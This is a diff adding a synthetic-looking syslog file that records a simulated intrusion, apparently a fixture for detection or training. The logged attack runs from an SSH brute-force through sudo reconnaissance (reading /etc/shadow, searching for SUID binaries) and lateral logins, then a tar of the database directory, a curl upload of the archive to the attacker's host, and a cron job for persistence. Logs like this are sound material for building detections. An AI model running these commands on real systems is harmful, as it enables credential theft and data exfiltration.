@@ -1,0 +1,21 @@
+<34>1 2026-05-13T08:30:01.001Z gateway sshd 4567 - failed password for invalid user admin from 198.51.100.5 port 41522 ssh2
+<34>1 2026-05-13T08:30:05.123Z gateway sshd 4567 - failed password for invalid user admin from 198.51.100.5 port 41523 ssh2
+<34>1 2026-05-13T08:30:12.450Z gateway sshd 4567 - failed password for invalid user admin from 198.51.100.5 port 41524 ssh2
+<34>1 2026-05-13T08:30:18.600Z gateway sshd 4567 - failed password for invalid user admin from 198.51.100.5 port 41525 ssh2
+<34>1 2026-05-13T08:30:25.880Z gateway sshd 4567 - failed password for invalid user admin from 198.51.100.5 port 41526 ssh2
+<34>1 2026-05-13T08:30:32.110Z gateway sshd 4567 - failed password for invalid user root from 198.51.100.5 port 41527 ssh2
+<34>1 2026-05-13T08:30:40.300Z gateway sshd 4567 - failed password for invalid user oracle from 198.51.100.5 port 41528 ssh2
+<34>1 2026-05-13T08:30:48.510Z gateway sshd 4567 - failed password for invalid user postgres from 198.51.100.5 port 41529 ssh2
+<86>1 2026-05-13T08:30:52.000Z gateway sshd 4567 - accepted password for admin from 198.51.100.5 port 41530 ssh2
+<86>1 2026-05-13T08:31:00.100Z gateway sudo 5012 - admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/whoami
+<86>1 2026-05-13T08:31:05.200Z gateway sudo 5012 - admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/id
+<86>1 2026-05-13T08:31:10.300Z gateway sudo 5012 - admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+<86>1 2026-05-13T08:31:22.400Z gateway sudo 5012 - admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/find / -perm -4000 -type f
+<38>1 2026-05-13T08:31:35.500Z fileserver sshd 4823 - accepted publickey for admin from 10.0.1.50 port 35112 ssh2
+<38>1 2026-05-13T08:31:48.600Z webserver sshd 4824 - accepted publickey for admin from 10.0.1.50 port 35113 ssh2
+<38>1 2026-05-13T08:32:01.700Z dbserver sshd 4825 - accepted publickey for admin from 10.0.1.50 port 35114 ssh2
+<86>1 2026-05-13T08:32:14.800Z dbserver bash 6011 - admin: tar czf /tmp/exfil.tgz /var/lib/postgresql/data
+<86>1 2026-05-13T08:32:30.900Z dbserver curl 6012 - admin: curl -X POST -F file=@/tmp/exfil.tgz https://198.51.100.5/upload
+<86>1 2026-05-13T08:32:42.000Z dbserver crontab 6013 - admin: crontab -e installed cron job for user admin
+<38>1 2026-05-13T08:33:00.000Z gateway sshd 4567 - session opened for user backup
+<38>1 2026-05-13T08:33:30.000Z gateway sshd 4567 - session closed for user backup
